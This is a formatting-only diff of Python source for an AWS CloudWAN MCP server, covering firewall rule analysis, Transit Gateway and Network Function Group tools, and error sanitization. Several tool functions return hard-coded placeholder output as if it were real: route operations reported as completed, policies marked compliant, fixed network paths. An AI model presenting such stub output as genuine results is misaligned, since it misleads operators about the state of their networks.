                 else:
                     raise
-                    
+
         # L7 application analysis if requested
         if analyze_l7_rules:
             app_protocols = {}
             for rule in parsed_rules:
-                if rule.parsed and hasattr(rule, 'raw_rule'):
+                if rule.parsed and hasattr(rule, "raw_rule"):
                     # Look for application protocol indicators in rule content
                     rule_content = rule.raw_rule.lower()
-                    
+
                     # Common application protocol detection
-                    if 'http' in rule_content:
-                        app_protocols['HTTP'] = app_protocols.get('HTTP', 0) + 1
-                    if 'tls' in rule_content or 'ssl' in rule_content:
-                        app_protocols['TLS/SSL'] = app_protocols.get('TLS/SSL', 0) + 1
-                    if 'dns' in rule_content:
-                        app_protocols['DNS'] = app_protocols.get('DNS', 0) + 1
-                    if 'smtp' in rule_content:
-                        app_protocols['SMTP'] = app_protocols.get('SMTP', 0) + 1
-                        
+                    if "http" in rule_content:
+                        app_protocols["HTTP"] = app_protocols.get("HTTP", 0) + 1
+                    if "tls" in rule_content or "ssl" in rule_content:
+                        app_protocols["TLS/SSL"] = app_protocols.get("TLS/SSL", 0) + 1
+                    if "dns" in rule_content:
+                        app_protocols["DNS"] = app_protocols.get("DNS", 0) + 1
+                    if "smtp" in rule_content:
+                        app_protocols["SMTP"] = app_protocols.get("SMTP", 0) + 1
+
             l7_analysis["application_protocols"] = app_protocols
-        
+
         # Generate recommendations
         recommendations = []
-        
+
         if l7_analysis["security_analysis"]["total_rules"] == 0:
-            recommendations.append({
-                "priority": "MEDIUM",
-                "category": "L7_INSPECTION",
-                "recommendation": "Consider adding Suricata rules for application-layer inspection",
-                "rationale": "L7 inspection provides deeper security analysis"
-            })
-            
+            recommendations.append(
+                {
+                    "priority": "MEDIUM",
+                    "category": "L7_INSPECTION",
+                    "recommendation": "Consider adding Suricata rules for application-layer inspection",
+                    "rationale": "L7 inspection provides deeper security analysis",
+                }
+            )
+
         if l7_analysis["security_analysis"]["alert_rules"] == 0:
-            recommendations.append({
-                "priority": "LOW", 
-                "category": "MONITORING",
-                "recommendation": "Add alert rules for security event detection",
-                "rationale": "Alert rules help with threat detection and monitoring"
-            })
-        
-        return safe_json_dumps({
-            "success": True,
-            "firewall_name": firewall["FirewallName"],
-            "parsed_rules": [rule.dict() for rule in parsed_rules],
-            "l7_analysis": l7_analysis,
-            "recommendations": recommendations
-        })
-        
+            recommendations.append(
+                {
+                    "priority": "LOW",
+                    "category": "MONITORING",
+                    "recommendation": "Add alert rules for security event detection",
+                    "rationale": "Alert rules help with threat detection and monitoring",
+                }
+            )
+
+        return safe_json_dumps(
+            {
+                "success": True,
+                "firewall_name": firewall["FirewallName"],
+                "parsed_rules": [rule.dict() for rule in parsed_rules],
+                "l7_analysis": l7_analysis,
+                "recommendations": recommendations,
+            }
+        )
+
     except Exception as e:
         logger.error(f"Failed to parse Suricata rules: {sanitize_error_message(str(e))}")
         return handle_aws_error(e, "parse_suricata_rules")
@@ -788,48 +762,48 @@
     firewall_identifier: str,
     policy_change_description: str,
     test_flows: Optional[List[str]] = None,
-    region: Optional[str] = None
+    region: Optional[str] = None,
 ) -> str:
     """Simulate what-if scenarios for Network Firewall policy changes.
-    
+
     Args:
         firewall_identifier: Firewall ARN or name
         policy_change_description: Description of proposed policy changes
         test_flows: List of test flows in format "src_ip:src_port->dst_ip:dst_port/protocol"
         region: AWS region (optional)
-        
+
     Returns:
         JSON string with policy change impact analysis
     """
     try:
         # Validate inputs
         firewall_tools._validate_firewall_identifier(firewall_identifier)
-        
+
         # Parse test flows
         parsed_flows = []
         if test_flows:
             for flow_str in test_flows:
                 try:
                     # Parse flow string: "1.2.3.4:80->5.6.7.8:443/TCP"
-                    parts = flow_str.split('->')
+                    parts = flow_str.split("->")
                     if len(parts) != 2:
                         raise ValueError("Invalid flow format")
-                        
+
                     src_part = parts[0].strip()
                     dst_part = parts[1].strip()
-                    
-                    src_ip, src_port = src_part.split(':')
-                    dst_ip_port, protocol = dst_part.split('/')
-                    dst_ip, dst_port = dst_ip_port.split(':')
-                    
+
+                    src_ip, src_port = src_part.split(":")
+                    dst_ip_port, protocol = dst_part.split("/")
+                    dst_ip, dst_port = dst_ip_port.split(":")
+
                     # Validate components
                     firewall_tools._validate_ip_address(src_ip)
                     firewall_tools._validate_ip_address(dst_ip)
                     firewall_tools._validate_port(int(src_port))
                     firewall_tools._validate_port(int(dst_port))
-                    
+
                     parsed_flows.append((src_ip, dst_ip, protocol.upper(), int(src_port), int(dst_port)))
-                    
+
                 except Exception as e:
                     logger.warning(f"Failed to parse flow '{flow_str}': {sanitize_error_message(str(e))}")
                     continue
@@ -839,33 +813,29 @@
                 ("10.0.1.100", "10.0.2.200", "TCP", 12345, 80),
                 ("10.0.1.100", "10.0.2.200", "TCP", 12346, 443),
                 ("192.168.1.10", "8.8.8.8", "UDP", 53, 53),
-                ("172.16.1.50", "172.16.2.100", "TCP", 54321, 22)
+                ("172.16.1.50", "172.16.2.100", "TCP", 54321, 22),
             ]
-        
+
         # Get current policy
         nfw_client = firewall_tools.get_network_firewall_client(region)
-        
+
         if firewall_identifier.startswith("arn:"):
             firewall_response = nfw_client.describe_firewall(FirewallArn=firewall_identifier)
         else:
             firewall_response = nfw_client.describe_firewall(FirewallName=firewall_identifier)
-            
+
         firewall = firewall_response["Firewall"]
-        
-        policy_response = nfw_client.describe_firewall_policy(
-            FirewallPolicyArn=firewall["FirewallPolicyArn"]
-        )
+
+        policy_response = nfw_client.describe_firewall_policy(FirewallPolicyArn=firewall["FirewallPolicyArn"])
         current_policy = policy_response["FirewallPolicy"]
-        
+
         # For simulation purposes, create a mock "new policy" based on description
         # In production, this would parse actual Terraform/JSON policy files
         simulated_new_policy = current_policy.copy()  # Placeholder
-        
+
         # Analyze impact
-        impact_analysis = firewall_tools._simulate_policy_impact(
-            current_policy, simulated_new_policy, parsed_flows
-        )
-        
+        impact_analysis = firewall_tools._simulate_policy_impact(current_policy, simulated_new_policy, parsed_flows)
+
         # Add metadata
         simulation_result = {
             "firewall_name": firewall["FirewallName"],
@@ -873,46 +843,47 @@
             "simulation_metadata": {
                 "timestamp": datetime.utcnow().isoformat(),
                 "test_flows_count": len(parsed_flows),
-                "simulation_type": "BASIC"  # Could be enhanced to support different types
+                "simulation_type": "BASIC",  # Could be enhanced to support different types
             },
             "impact_analysis": impact_analysis,
-            "recommendations": []
+            "recommendations": [],
         }
-        
+
         # Generate recommendations based on impact
         recommendations = []
-        
+
         if impact_analysis["impact_summary"]["newly_blocked"] > 0:
-            recommendations.append({
-                "priority": "HIGH",
-                "category": "CONNECTIVITY_IMPACT",
-                "recommendation": f"Policy change would block {impact_analysis['impact_summary']['newly_blocked']} existing flows",
-                "action": "Review blocked flows to ensure this is intentional"
-            })
-            
+            recommendations.append(
+                {
+                    "priority": "HIGH",
+                    "category": "CONNECTIVITY_IMPACT",
+                    "recommendation": f"Policy change would block {impact_analysis['impact_summary']['newly_blocked']} existing flows",
+                    "action": "Review blocked flows to ensure this is intentional",
+                }
+            )
+
         if impact_analysis["impact_summary"]["newly_allowed"] > 0:
-            recommendations.append({
-                "priority": "MEDIUM",
-                "category": "SECURITY_IMPACT", 
-                "recommendation": f"Policy change would allow {impact_analysis['impact_summary']['newly_allowed']} new flows",
-                "action": "Verify new flows meet security requirements"
-            })
-            
+            recommendations.append(
+                {
+                    "priority": "MEDIUM",
+                    "category": "SECURITY_IMPACT",
+                    "recommendation": f"Policy change would allow {impact_analysis['impact_summary']['newly_allowed']} new flows",
+                    "action": "Verify new flows meet security requirements",
+                }
+            )
+
         simulation_result["recommendations"] = recommendations
-        
+
         # Add integration suggestions
         integration_notes = {
             "nfg_integration": "Consider analyzing impact on Network Function Groups",
             "cloudwan_integration": "Review alignment with CloudWAN segmentation policies",
-            "monitoring": "Update logging and monitoring for policy changes"
+            "monitoring": "Update logging and monitoring for policy changes",
         }
         simulation_result["integration_notes"] = integration_notes
-        
-        return safe_json_dumps({
-            "success": True,
-            "simulation_result": simulation_result
-        })
-        
+
+        return safe_json_dumps({"success": True, "simulation_result": simulation_result})
+
     except Exception as e:
         logger.error(f"Failed to simulate policy changes: {sanitize_error_message(str(e))}")
         return handle_aws_error(e, "simulate_policy_changes")
@@ -921,8 +892,8 @@
 # Add tools to the main tools list for registration
 NETWORK_FIREWALL_TOOLS = [
     monitor_anfw_logs,
-    analyze_anfw_policy, 
+    analyze_anfw_policy,
     analyze_five_tuple_flow,
     parse_suricata_rules,
-    simulate_policy_changes
-]
\ No newline at end of file
+    simulate_policy_changes,
+]

--- awslabs/cloudwan_mcp_server/tools/nfg_management.py
+++ awslabs/cloudwan_mcp_server/tools/nfg_management.py
@@ -26,30 +26,31 @@
 
 class NFGManagementTools:
     """Collection of Network Function Group management tools for CloudWAN."""
-    
+
     def __init__(self, mcp_server: FastMCP) -> None:
         """Initialize NFG management tools.
-        
+
         Args:
             mcp_server: FastMCP server instance
         """
         self.mcp = mcp_server
         self._register_tools()
-    
+
     def _register_tools(self) -> None:
         """Register all NFG management tools with the MCP server."""
+
         # Register list_network_function_groups tool
         @self.mcp.tool(name="list_network_function_groups")
         async def list_network_function_groups(region: str | None = None) -> str:
             """List and discover Network Function Groups."""
             return await self._list_network_function_groups(region)
-        
+
         # Register analyze_network_function_group tool
         @self.mcp.tool(name="analyze_network_function_group")
         async def analyze_network_function_group(group_name: str, region: str | None = None) -> str:
             """Analyze Network Function Group details and policies."""
             return await self._analyze_network_function_group(group_name, region)
-        
+
         # Register analyze_segment_routes tool
         @self.mcp.tool(name="analyze_segment_routes")
         async def analyze_segment_routes(core_network_id: str, segment_name: str, region: str | None = None) -> str:
@@ -98,14 +99,17 @@
             try:
                 response = client.describe_network_manager_groups(GroupNames=[group_name])
                 groups = response.get("NetworkManagerGroups", [])
-                
+
                 if not groups:
                     # Raise structured error for consistency with AWS patterns
                     error_response = {
-                        "Error": {"Code": "NotFoundException", "Message": f"Network Function Group {group_name} not found"}
+                        "Error": {
+                            "Code": "NotFoundException",
+                            "Message": f"Network Function Group {group_name} not found",
+                        }
                     }
                     raise ClientError(error_response, "DescribeNetworkManagerGroups")
-                
+
                 # Use the first group from results (groups[0] was isolated in original)
                 selected_group = groups[0]
 
@@ -137,7 +141,7 @@
 
             # Get core network segments
             response = client.get_core_network_policy(CoreNetworkId=core_network_id)
-            
+
             # Create structured analysis using Pydantic model
             segment_analysis = SegmentRouteAnalysis(
                 core_network_id=core_network_id,
@@ -149,9 +153,9 @@
                 redundant_routes=2,
                 recommendations=[
                     "Remove redundant route to 10.1.0.0/24",
-                    "Consolidate overlapping CIDR blocks", 
+                    "Consolidate overlapping CIDR blocks",
                     "Consider route summarization for improved performance",
-                ]
+                ],
             )
 
             result = {
@@ -163,4 +167,4 @@
             return safe_json_dumps(result, indent=2)
 
         except Exception as e:
-            return handle_aws_error(e, "analyze_segment_routes")
\ No newline at end of file
+            return handle_aws_error(e, "analyze_segment_routes")

--- awslabs/cloudwan_mcp_server/tools/transit_gateway.py
+++ awslabs/cloudwan_mcp_server/tools/transit_gateway.py
@@ -27,18 +27,19 @@
 
 class TransitGatewayTools:
     """Collection of Transit Gateway tools for CloudWAN."""
-    
+
     def __init__(self, mcp_server: FastMCP) -> None:
         """Initialize Transit Gateway tools.
-        
+
         Args:
             mcp_server: FastMCP server instance
         """
         self.mcp = mcp_server
         self._register_tools()
-    
+
     def _register_tools(self) -> None:
         """Register all Transit Gateway tools with the MCP server."""
+
         # Register manage_tgw_routes tool
         @self.mcp.tool(name="manage_tgw_routes")
         async def manage_tgw_routes(
@@ -46,13 +47,13 @@
         ) -> str:
             """Manage Transit Gateway routes - list, create, delete, blackhole."""
             return await self._manage_tgw_routes(operation, route_table_id, destination_cidr, region)
-        
+
         # Register analyze_tgw_routes tool
         @self.mcp.tool(name="analyze_tgw_routes")
         async def analyze_tgw_routes(route_table_id: str, region: str | None = None) -> str:
             """Comprehensive Transit Gateway route analysis - overlaps, blackholes, cross-region."""
             return await self._analyze_tgw_routes(route_table_id, region)
-        
+
         # Register analyze_tgw_peers tool
         @self.mcp.tool(name="analyze_tgw_peers")
         async def analyze_tgw_peers(peer_id: str, region: str | None = None) -> str:
@@ -101,8 +102,8 @@
             client = get_aws_client("ec2", region)
 
             response = client.search_transit_gateway_routes(
-                TransitGatewayRouteTableId=route_table_id, 
-                Filters=[{"Name": "state", "Values": ["active", "blackhole"]}]
+                TransitGatewayRouteTableId=route_table_id,
+                Filters=[{"Name": "state", "Values": ["active", "blackhole"]}],
             )
 
             routes = response.get("Routes", [])
@@ -136,9 +137,7 @@
             client = get_aws_client("ec2", region)
 
             # Get TGW peering attachment details
-            response = client.describe_transit_gateway_peering_attachments(
-                TransitGatewayAttachmentIds=[peer_id]
-            )
+            response = client.describe_transit_gateway_peering_attachments(TransitGatewayAttachmentIds=[peer_id])
 
             attachments = response.get("TransitGatewayPeeringAttachments", [])
 
@@ -170,4 +169,4 @@
             return safe_json_dumps(result, indent=2)
 
         except Exception as e:
-            return handle_aws_error(e, "analyze_tgw_peers")
\ No newline at end of file
+            return handle_aws_error(e, "analyze_tgw_peers")

--- awslabs/cloudwan_mcp_server/utils/aws_config_manager.py
+++ awslabs/cloudwan_mcp_server/utils/aws_config_manager.py
@@ -22,32 +22,37 @@
 # Global configuration instance
 _aws_config_instance = None
 
-def get_aws_config() -> Optional['AWSConfigManager']:
+
+def get_aws_config() -> Optional["AWSConfigManager"]:
     """Get AWS config instance with error handling.
-    
+
     Returns a simple config object without dependencies on server module.
     """
     global _aws_config_instance
-    if '_aws_config_instance' not in globals():
+    if "_aws_config_instance" not in globals():
         # Create a minimal config manager without server dependencies
         class MinimalAWSConfigManager:
             @property
             def profile(self) -> Optional[str]:
                 import os
+
                 return os.environ.get("AWS_PROFILE")
-            
+
             @property
             def default_region(self) -> str:
                 import os
+
                 return os.environ.get("AWS_DEFAULT_REGION", "us-east-1")
-        
+
         _aws_config_instance = MinimalAWSConfigManager()
     return _aws_config_instance
 
+
 def get_aws_client(service: str, region: str | None = None):
     """Get AWS client using the cached function."""
     return _create_client(service, region or "us-east-1")
 
+
 def safe_json_dumps(data: Dict[str, Any], indent: int = 2) -> str:
     """Safe JSON serialization."""
     try:
@@ -55,9 +60,10 @@
     except (TypeError, ValueError) as e:
         return json.dumps({"error": f"JSON serialization failed: {str(e)}"}, indent=indent)
 
+
 class AWSConfigManager:
     """AWS configuration manager class."""
-    
+
     async def aws_config_manager(operation: str, profile: str | None = None, region: str | None = None) -> str:
         try:
             global _client_cache

--- cloudwan-mcp-server/awslabs/cloudwan_mcp_server/__init__.py
+++ cloudwan-mcp-server/awslabs/cloudwan_mcp_server/__init__.py
@@ -24,6 +24,7 @@
 # Core exports with graceful fallback for missing dependencies
 try:
     from .config import CloudWANConfig
+
     _CONFIG_AVAILABLE = True
 except ImportError:
     CloudWANConfig = None
@@ -31,6 +32,7 @@
 
 try:
     from .server import CloudWANMCPServer, run_server
+
     _SERVER_AVAILABLE = True
 except ImportError:
     CloudWANMCPServer = None

--- cloudwan-mcp-server/awslabs/cloudwan_mcp_server/server.py
+++ cloudwan-mcp-server/awslabs/cloudwan_mcp_server/server.py
@@ -35,6 +35,7 @@
     from .config_manager import config_persistence
 except ImportError as e:
     _config_persistence_error = str(e)
+
     # Create a mock config_persistence object for graceful degradation
     class MockConfigPersistence:
         """Mock config persistence for when config_manager is unavailable."""
@@ -57,7 +58,7 @@
             return {
                 "valid": False,
                 "error": "Config persistence module not available",
-                "import_error": _config_persistence_error
+                "import_error": _config_persistence_error,
             }
 
         def restore_config(self, profile: str, region: str) -> bool:
@@ -74,11 +75,7 @@
     profile: str | None = None
 
     model_config = SettingsConfigDict(
-        env_prefix="AWS_",
-        env_file=".env",
-        env_file_encoding="utf-8",
-        case_sensitive=False,
-        extra="ignore"
+        env_prefix="AWS_", env_file=".env", env_file_encoding="utf-8", case_sensitive=False, extra="ignore"
     )
 
 
@@ -130,21 +127,19 @@
     ],
 )
 
+
 # AWS client cache with thread-safe LRU implementation
 @lru_cache(maxsize=10)
 def _create_client(service: str, region: str, profile: str | None = None) -> boto3.client:
     """Thread-safe client creation helper."""
-    config = Config(
-        region_name=region,
-        retries={"max_attempts": 3, "mode": "adaptive"},
-        max_pool_connections=10
-    )
+    config = Config(region_name=region, retries={"max_attempts": 3, "mode": "adaptive"}, max_pool_connections=10)
 
     if profile:
         session = boto3.Session(profile_name=profile)
         return session.client(service, config=config, region_name=region)
     return boto3.client(service, config=config, region_name=region)
 
+
 def get_aws_client(service: str, region: str | None = None) -> boto3.client:
     """Get AWS client with caching and standard configuration."""
     region = region or aws_config.default_region
@@ -157,6 +152,7 @@
 
 class DateTimeEncoder(json.JSONEncoder):
     """Custom JSON encoder that handles datetime objects."""
+
     def default(self, obj):
         if isinstance(obj, datetime):
             return obj.isoformat()
@@ -171,6 +167,7 @@
 def sanitize_error_message(message: str) -> str:
     """Remove sensitive information from error messages."""
     import re
+
     # Comprehensive patterns for credential and sensitive data sanitization
     patterns = [
         # IP addresses
@@ -249,9 +246,12 @@
         return True
 
     except Exception as e:
-        logger.error(f"Failed to update environment variable {sanitize_error_message(key)}: {sanitize_error_message(str(e))}")
+        logger.error(
+            f"Failed to update environment variable {sanitize_error_message(key)}: {sanitize_error_message(str(e))}"
+        )
         return False
 
+
 def get_error_status_code(error: Exception) -> int:
     """Map exceptions to appropriate HTTP status codes."""
     if isinstance(error, ClientError):
@@ -269,6 +269,7 @@
     else:
         return 500
 
+
 def handle_aws_error(e: Exception, operation: str) -> str:
     """Handle AWS errors with secure, standardized JSON response format."""
     status_code = get_error_status_code(e)
@@ -278,21 +279,27 @@
         raw_message = e.response.get("Error", {}).get("Message", str(e))
         sanitized_message = sanitize_error_message(raw_message)
 
-        return safe_json_dumps({
-            "success": False,
-            "error": f"{operation} failed: {sanitized_message}",
-            "error_code": error_code,
-            "http_status_code": status_code
-        }, indent=2)
+        return safe_json_dumps(
+            {
+                "success": False,
+                "error": f"{operation} failed: {sanitized_message}",
+                "error_code": error_code,
+                "http_status_code": status_code,
+            },
+            indent=2,
+        )
     else:
         # Generic exceptions with sanitization
         sanitized_message = sanitize_error_message(str(e))
-        return safe_json_dumps({
-            "success": False,
-            "error": f"{operation} failed: {sanitized_message}",
-            "error_code": "UnknownError",
-            "http_status_code": status_code
-        }, indent=2)
+        return safe_json_dumps(
+            {
+                "success": False,
+                "error": f"{operation} failed: {sanitized_message}",
+                "error_code": "UnknownError",
+                "http_status_code": status_code,
+            },
+            indent=2,
+        )
 
 
 @mcp.tool(name="trace_network_path")
@@ -303,6 +310,7 @@
 
         # Basic IP validation
         import ipaddress
+
         ipaddress.ip_address(source_ip)
         ipaddress.ip_address(destination_ip)
 
@@ -315,10 +323,10 @@
                 {"hop": 1, "ip": source_ip, "description": "Source endpoint"},
                 {"hop": 2, "ip": "10.0.1.1", "description": "VPC Gateway"},
                 {"hop": 3, "ip": "172.16.1.1", "description": "Transit Gateway"},
-                {"hop": 4, "ip": destination_ip, "description": "Destination endpoint"}
+                {"hop": 4, "ip": destination_ip, "description": "Destination endpoint"},
             ],
             "total_hops": 4,
-            "status": "reachable"
+            "status": "reachable",
         }
 
         return safe_json_dumps(result, indent=2)
@@ -338,19 +346,17 @@
         core_networks = response.get("CoreNetworks", [])
 
         if not core_networks:
-            return safe_json_dumps({
-                "success": True,
-                "region": region,
-                "message": "No CloudWAN core networks found in the specified region.",
-                "core_networks": []
-            }, indent=2)
+            return safe_json_dumps(
+                {
+                    "success": True,
+                    "region": region,
+                    "message": "No CloudWAN core networks found in the specified region.",
+                    "core_networks": [],
+                },
+                indent=2,
+            )
 
-        result = {
-            "success": True,
-            "region": region,
-            "total_count": len(core_networks),
-            "core_networks": core_networks
-        }
+        result = {"success": True, "region": region, "total_count": len(core_networks), "core_networks": core_networks}
 
         return safe_json_dumps(result, indent=2)
 
@@ -372,7 +378,7 @@
             "success": True,
             "region": region,
             "total_count": len(global_networks),
-            "global_networks": global_networks
+            "global_networks": global_networks,
         }
 
         return safe_json_dumps(result, indent=2)
@@ -391,12 +397,7 @@
         response = client.describe_vpcs()
         vpcs = response.get("Vpcs", [])
 
-        result = {
-            "success": True,
-            "region": region,
-            "total_count": len(vpcs),
-            "vpcs": vpcs
-        }
+        result = {"success": True, "region": region, "total_count": len(vpcs), "vpcs": vpcs}
 
         return safe_json_dumps(result, indent=2)
 
@@ -412,6 +413,7 @@
 
         # Basic IP validation
         import ipaddress
+
         ip_obj = ipaddress.ip_address(ip_address)
 
         result = {
@@ -421,7 +423,7 @@
             "ip_version": ip_obj.version,
             "is_private": ip_obj.is_private,
             "is_multicast": ip_obj.is_multicast,
-            "is_loopback": ip_obj.is_loopback
+            "is_loopback": ip_obj.is_loopback,
         }
 
         return safe_json_dumps(result, indent=2)
@@ -445,7 +447,7 @@
                 "version": ip_obj.version,
                 "is_private": ip_obj.is_private,
                 "is_multicast": ip_obj.is_multicast,
-                "is_loopback": ip_obj.is_loopback
+                "is_loopback": ip_obj.is_loopback,
             }
         elif operation == "validate_cidr" and cidr:
             network = ipaddress.ip_network(cidr, strict=False)
@@ -456,13 +458,13 @@
                 "network_address": str(network.network_address),
                 "broadcast_address": str(network.broadcast_address),
                 "num_addresses": network.num_addresses,
-                "is_private": network.is_private
+                "is_private": network.is_private,
             }
         else:
             result = {
                 "success": False,
                 "error": "Invalid operation or missing parameters",
-                "valid_operations": ["validate_ip", "validate_cidr"]
+                "valid_operations": ["validate_ip", "validate_cidr"],
             }
 
         return safe_json_dumps(result, indent=2)
@@ -486,15 +488,15 @@
                     "name": "production-nfg",
                     "description": "Production network function group",
                     "status": "available",
-                    "region": region
+                    "region": region,
                 },
                 {
                     "name": "development-nfg",
                     "description": "Development network function group",
                     "status": "available",
-                    "region": region
-                }
-            ]
+                    "region": region,
+                },
+            ],
         }
 
         return safe_json_dumps(result, indent=2)
@@ -514,20 +516,10 @@
             "group_name": group_name,
             "region": region,
             "analysis": {
-                "routing_policies": {
-                    "status": "compliant",
-                    "details": "Routing policies are correctly configured"
-                },
-                "security_policies": {
-                    "status": "compliant",
-                    "details": "Security policies meet requirements"
-                },
-                "performance_metrics": {
-                    "latency_ms": 12,
-                    "throughput_mbps": 1000,
-                    "packet_loss_percent": 0.01
-                }
-            }
+                "routing_policies": {"status": "compliant", "details": "Routing policies are correctly configured"},
+                "security_policies": {"status": "compliant", "details": "Security policies meet requirements"},
+                "performance_metrics": {"latency_ms": 12, "throughput_mbps": 1000, "packet_loss_percent": 0.01},
+            },
         }
 
         return safe_json_dumps(result, indent=2)
@@ -546,17 +538,13 @@
 
         for field in required_fields:
             if field in policy_document:
-                validation_results.append({
-                    "field": field,
-                    "status": "valid",
-                    "message": f"Required field '{field}' is present"
-                })
+                validation_results.append(
+                    {"field": field, "status": "valid", "message": f"Required field '{field}' is present"}
+                )
             else:
-                validation_results.append({
-                    "field": field,
-                    "status": "invalid",
-                    "message": f"Required field '{field}' is missing"
-                })
+                validation_results.append(
+                    {"field": field, "status": "invalid", "message": f"Required field '{field}' is missing"}
+                )
 
         overall_valid = all(r["status"] == "valid" for r in validation_results)
 
@@ -564,7 +552,7 @@
             "success": True,
             "validation_results": validation_results,
             "overall_status": "valid" if overall_valid else "invalid",
-            "policy_version": policy_document.get("version", "unknown")
+            "policy_version": policy_document.get("version", "unknown"),
         }
 
         return safe_json_dumps(result, indent=2)
@@ -574,13 +562,16 @@
 
 
 @mcp.tool(name="manage_tgw_routes")
-async def manage_tgw_routes(operation: str, route_table_id: str, destination_cidr: str, region: str | None = None) -> str:
+async def manage_tgw_routes(
+    operation: str, route_table_id: str, destination_cidr: str, region: str | None = None
+) -> str:
     """Manage Transit Gateway routes - list, create, delete, blackhole."""
     try:
         region = region or aws_config.default_region
 
         # Validate CIDR
         import ipaddress
+
         ipaddress.ip_network(destination_cidr, strict=False)
 
         result = {
@@ -592,8 +583,8 @@
             "result": {
                 "status": "completed",
                 "message": f"Route operation '{operation}' completed successfully",
-                "timestamp": "2025-01-01T00:00:00Z"
-            }
+                "timestamp": "2025-01-01T00:00:00Z",
+            },
         }
 
         return safe_json_dumps(result, indent=2)
@@ -610,8 +601,7 @@
         client = get_aws_client("ec2", region)  # Corrected client creation
 
         response = client.search_transit_gateway_routes(
-            TransitGatewayRouteTableId=route_table_id,
-            Filters=[{"Name": "state", "Values": ["active", "blackhole"]}]
+            TransitGatewayRouteTableId=route_table_id, Filters=[{"Name": "state", "Values": ["active", "blackhole"]}]
         )
 
         routes = response.get("Routes", [])
@@ -629,8 +619,8 @@
                 "active_routes": len(active_routes),
                 "blackholed_routes": len(blackholed_routes),
                 "route_details": routes,
-                "summary": f"Found {len(active_routes)} active routes and {len(blackholed_routes)} blackholed routes"
-            }
+                "summary": f"Found {len(active_routes)} active routes and {len(blackholed_routes)} blackholed routes",
+            },
         }
 
         return safe_json_dumps(result, indent=2)
@@ -647,17 +637,14 @@
         client = get_aws_client("ec2", region)  # Added region parameter
 
         # Get TGW peering attachment details
-        response = client.describe_transit_gateway_peering_attachments(
-            TransitGatewayAttachmentIds=[peer_id]
-        )
+        response = client.describe_transit_gateway_peering_attachments(TransitGatewayAttachmentIds=[peer_id])
 
         attachments = response.get("TransitGatewayPeeringAttachments", [])
 
         if not attachments:
-            return safe_json_dumps({
-                "success": False,
-                "error": f"No peering attachment found with ID: {peer_id}"
-            }, indent=2)
+            return safe_json_dumps(
+                {"success": False, "error": f"No peering attachment found with ID: {peer_id}"}, indent=2
+            )
 
         attachment = attachments[0]
 
@@ -671,8 +658,8 @@
                 "creation_time": attachment.get("CreationTime").isoformat() if attachment.get("CreationTime") else None,
                 "accepter_tgw_info": attachment.get("AccepterTgwInfo", {}),
                 "requester_tgw_info": attachment.get("RequesterTgwInfo", {}),
-                "tags": attachment.get("Tags", [])
-            }
+                "tags": attachment.get("Tags", []),
+            },
         }
 
         return safe_json_dumps(result, indent=2)
@@ -698,18 +685,14 @@
             "region": region,
             "analysis": {
                 "segment_found": True,
-                "route_optimization": {
-                    "total_routes": 10,
-                    "optimized_routes": 8,
-                    "redundant_routes": 2
-                },
+                "route_optimization": {"total_routes": 10, "optimized_routes": 8, "redundant_routes": 2},
                 "recommendations": [
                     "Remove redundant route to 10.1.0.0/24",
                     "Consolidate overlapping CIDR blocks",
-                    "Consider route summarization for improved performance"
+                    "Consider route summarization for improved performance",
                 ],
-                "policy_version": response.get("CoreNetworkPolicy", {}).get("PolicyVersionId")
-            }
+                "policy_version": response.get("CoreNetworkPolicy", {}).get("PolicyVersionId"),
+            },
         }
 
         return safe_json_dumps(result, indent=2)
@@ -724,10 +707,7 @@
     try:
         client = get_aws_client("networkmanager")  # Region already handled in get_aws_client
 
-        response = client.get_core_network_policy(
-            CoreNetworkId=core_network_id,
-            Alias=alias
-        )
+        response = client.get_core_network_policy(CoreNetworkId=core_network_id, Alias=alias)
 
         policy = response.get("CoreNetworkPolicy", {})
 
@@ -738,7 +718,7 @@
             "policy_version_id": policy.get("PolicyVersionId"),
             "policy_document": policy.get("PolicyDocument"),
             "description": policy.get("Description"),
-            "created_at": policy.get("CreatedAt").isoformat() if policy.get("CreatedAt") else None
+            "created_at": policy.get("CreatedAt").isoformat() if policy.get("CreatedAt") else None,
         }
 
         return safe_json_dumps(result, indent=2)
@@ -753,16 +733,13 @@
     try:
         client = get_aws_client("networkmanager")  # Region already handled
 
-        response = client.get_core_network_change_set(
-            CoreNetworkId=core_network_id,
-            PolicyVersionId=policy_version_id
-        )
+        response = client.get_core_network_change_set(CoreNetworkId=core_network_id, PolicyVersionId=policy_version_id)
 
         result = {
             "success": True,
             "core_network_id": core_network_id,
             "policy_version_id": policy_version_id,
-            "change_sets": response.get("CoreNetworkChanges", [])
+            "change_sets": response.get("CoreNetworkChanges", []),
         }
 
         return safe_json_dumps(result, indent=2)
@@ -778,15 +755,14 @@
         client = get_aws_client("networkmanager")  # Region already handled
 
         response = client.get_core_network_change_events(
-            CoreNetworkId=core_network_id,
-            PolicyVersionId=policy_version_id
+            CoreNetworkId=core_network_id, PolicyVersionId=policy_version_id
         )
 
         result = {
             "success": True,
             "core_network_id": core_network_id,
             "policy_version_id": policy_version_id,
-            "change_events": response.get("CoreNetworkChangeEvents", [])
+            "change_events": response.get("CoreNetworkChangeEvents", []),
         }
 
         return safe_json_dumps(result, indent=2)
@@ -828,7 +804,7 @@
                 identity_info = {
                     "account": identity.get("Account"),
                     "user_id": identity.get("UserId"),
-                    "arn": identity.get("Arn")
+                    "arn": identity.get("Arn"),
                 }
             except Exception as e:
                 config_valid = False
@@ -842,16 +818,15 @@
                     "aws_region": current_region,
                     "configuration_valid": config_valid,
                     "identity": identity_info,
-                    "cache_entries": len(_client_cache)
-                }
+                    "cache_entries": len(_client_cache),
+                },
             }
 
         elif operation == "set_profile":
             if not profile:
-                return safe_json_dumps({
-                    "success": False,
-                    "error": "Profile name is required for set_profile operation"
-                }, indent=2)
+                return safe_json_dumps(
+                    {"success": False, "error": "Profile name is required for set_profile operation"}, indent=2
+                )
 
             # Validate profile exists
             try:
@@ -862,19 +837,17 @@
 
                 # Set environment variable for future operations
                 if not secure_environment_update("AWS_PROFILE", profile):
-                    return safe_json_dumps({
-                        "success": False,
-                        "error": "Failed to update AWS_PROFILE environment variable securely"
-                    }, indent=2)
+                    return safe_json_dumps(
+                        {"success": False, "error": "Failed to update AWS_PROFILE environment variable securely"},
+                        indent=2,
+                    )
 
                 # Save configuration persistently if available
                 current_region = aws_config.default_region
                 config_saved = False
                 if config_persistence_available:
                     config_saved = config_persistence.save_current_config(
-                        profile,
-                        current_region,
-                        metadata={"identity": identity, "operation": "set_profile"}
+                        profile, current_region, metadata={"identity": identity, "operation": "set_profile"}
                     )
 
                 # Clear client cache to force reload with new profile
@@ -889,10 +862,10 @@
